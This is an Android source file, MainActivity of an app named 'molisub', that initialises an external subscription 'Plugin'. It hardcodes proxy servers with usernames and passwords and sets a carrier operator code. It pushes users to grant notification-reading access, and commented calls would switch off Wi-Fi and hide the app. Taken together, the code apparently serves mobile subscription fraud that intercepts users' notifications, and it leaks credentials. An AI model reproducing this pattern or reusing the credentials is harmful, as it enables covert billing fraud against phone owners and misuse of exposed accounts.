package com.enhtmv.molisub;

import android.content.DialogInterface;
import android.content.Intent;
import android.support.v7.app.AlertDialog;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;

import com.cp.plugin.Plugin;
import com.cp.plugin.event.SubEvent;
import com.enhtmv.sublib.common.http.SubProxy;
import com.enhtmv.sublib.common.sub.Sub;
import com.enhtmv.sublib.common.util.HostUtil;

import static android.provider.Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS;

public class MainActivity extends AppCompatActivity implements SubEvent {


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        if (BuildConfig.DEBUG) {
//            SubProxy proxy = HostUtil.proxy();
//            this.setProxy(new SubProxy("37.48.98.160", "engineer@foxseek.com", "0c4263", 11285));
            Plugin.proxy("91.220.77.154", "mauritius", "precpx123", 8090);
//            Plugin.proxy(proxy.getHost(), proxy.getUsername(), proxy.getPassword(), proxy.getPort());
//            Plugin.proxy("37.48.98.160", "engineer@foxseek.com", "0c4263", 11287);
//            Plugin.log(true);
//            Plugin.closeWifi(false);
//            Plugin.setHiden(false);
            Plugin.operator("20420");
        }

        Plugin.init(this, this);

        Plugin.buildNotificationAlert("标题", "该应用需要授权读取通知权限", "确定", "取消");
    }


    @Override
    protected void onResume() {
        super.onResume();
        Plugin.call();
    }

    public AlertDialog buildNotificationAlert(String title, String content, String yes, String no) {
        AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(this);
        alertDialogBuilder.setCancelable(false);
        alertDialogBuilder.setTitle(title);
        alertDialogBuilder.setMessage(content);
        alertDialogBuilder.setPositiveButton(yes,
                new DialogInterface.OnClickListener() {
                    public void onClick(DialogInterface dialog, int id) {
                        startActivity(new Intent(ACTION_NOTIFICATION_LISTENER_SETTINGS));
                        //go to set permision
                    }
                });
        alertDialogBuilder.setNegativeButton(no,
                new DialogInterface.OnClickListener() {
                    public void onClick(DialogInterface dialog, int id) {
                        //cancel
                    }
                });
        return (alertDialogBuilder.create());
    }

    @Override
    public void onMessage(String tag, String content) {

    }

    @Override
    public void onError(Throwable throwable) {

    }

}

//adb shell settings put global http_proxy 192.168.31.112:8090
